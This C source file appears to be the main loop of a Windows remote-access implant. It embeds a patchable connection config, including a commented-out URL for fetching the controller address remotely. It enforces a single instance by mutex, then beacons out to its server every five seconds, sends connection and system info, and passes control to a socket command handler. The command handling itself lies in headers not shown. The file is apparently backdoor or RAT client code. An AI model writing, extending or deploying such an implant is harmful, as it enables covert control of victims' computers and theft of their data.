
#include "common.h"
#include "service.h"
#include "socket.h"
#include "model.h"
#include "batch.h"
#include "systeminfo.h"
#include "postman.h"
#include "http.h"
#include <conio.h>
#include <lm.h>
#include <lmmsg.h>
#include <stdlib.h>

#define UNIX_PATH "/usr/local/bin;/usr/local/sbin;/usr/bin;/usr/sbin;/usr/games;/bin;/sbin"

#pragma pack(push,1)
struct ConnInfo
{
	BYTE byFlag;
	WORD wPort;
	CHAR szParam[1024];
};// connSetting={1,0,"http://w.s.gp/conn.inf\0\0\0"};
#pragma pack(pop)
struct ConnInfo connSetting = { 0, 2133, "127.0.0.1" };
/*
   BOOL WINAPI ConsoleHandler(DWORD CEvent)
   {
   switch(CEvent)
   {
   case CTRL_BREAK_EVENT:
   uninitSocket();
   break;
   case CTRL_CLOSE_EVENT:
   break;
   case CTRL_LOGOFF_EVENT:
   case CTRL_SHUTDOWN_EVENT:
   uninitSocket();
   break;
   }
   return TRUE;
   }
 */
/*
   BOOL getUserName(char**lpszUsername)
   {
   BOOL bRet = FALSE;
   CHAR *szLogName = NULL;
   DWORD dwSize = 0;
   if (WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE,
   WTS_CURRENT_SESSION,
   WTSUserName,
   &szLogName,
   &dwSize))
   {
 *lpszUsername=malloc(dwSize);
 memcpy(*lpszUsername,szLogName,dwSize);
 WTSFreeMemory(szLogName);
 bRet = TRUE;
 }

 return bRet;
 }
 */
int main()
{

	HANDLE hMutex=CreateMutexA(NULL,FALSE,"MainProc00");
	if (hMutex && GetLastError()==ERROR_ALREADY_EXISTS)
		return -1;
	/*
	   if(SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleHandler,TRUE)==FALSE)
	   return 1;
	 */
	initBase();
	initSocket();
	initHeaderList();
	initINet();
	initPostman();

	if(getenv("WINELOADERNOEXEC")) {
		// If we are running by Wine ...
		const char *path = getenv("PATH");
		char new_path[strlen(path) + 1 + sizeof UNIX_PATH];
		strcpy(new_path, path);
		strcat(new_path, ";" UNIX_PATH);
		setenv("PATH", new_path, 1);
	}

	char con_addr[16];
	unsigned short con_port;
	char connInfo[25];

	while(1)
	{
		if((connSetting.byFlag & 1)==0)
		{
			strcpy(con_addr,connSetting.szParam);
			con_port=connSetting.wPort;
		}else{
			int ret;
			ret=httpRead(connSetting.szParam, connInfo, sizeof(connInfo));
			connInfo[ret]=0;
			if(!ret)
			{
				Sleep(5000);
				continue;
			}
			ret=resoveConnInfo(connInfo,con_addr,&con_port);
			if(ret)
			{
				Sleep(5000);
				continue;
			}

		}
		setConnectionAttrib(con_addr,con_port);
		if(connectToServer())
		{
			Sleep(5000);
			continue;
		}
		sendConnectionInfo();
		socketDataHander();
		Sleep(5000);
	}

	return 0;
}
